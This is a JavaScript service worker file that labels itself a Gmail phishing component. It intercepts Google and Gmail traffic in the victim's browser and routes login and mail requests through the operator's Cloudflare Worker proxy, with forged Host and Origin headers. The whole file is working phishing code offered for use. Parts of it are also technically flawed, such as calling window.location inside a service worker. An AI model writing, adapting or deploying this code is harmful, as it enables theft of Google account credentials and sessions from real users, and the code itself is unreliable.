// sw.js - Gmail Phishing Service Worker v2.3
// Intercepts ALL Google traffic → proxies through your Worker

self.addEventListener('install', event => {
  self.skipWaiting();
});

self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // PROXY ALL GMAIL/GOOGLE TRAFFIC THROUGH YOUR WORKER
  if (url.hostname.includes('google.com') || 
      url.hostname.includes('gstatic.com') || 
      url.hostname.includes('accounts.google.com')) {
    
    // Rewrite to your proxy paths
    const proxyPath = url.pathname + url.search;
    
    // Match your Worker routes exactly
    if (proxyPath.match(/^\/mail\/|^\/accounts\/|^\/static\//)) {
      const proxiedUrl = new URL(window.location.origin + proxyPath);
      event.respondWith(
        fetch(proxiedUrl, {
          ...event.request,
          headers: {
            ...event.request.headers,
            'Host': 'mail.google.com',
            'Origin': 'https://mail.google.com'
          }
        })
      );
    }
  }
  
  // BYPASS SERVICE WORKER FOR YOUR PROXY (let Worker handle it)
  if (url.pathname.startsWith('/mail/') || url.pathname.startsWith('/accounts/')) {
    return; // Let Cloudflare Worker handle directly
  }
});;
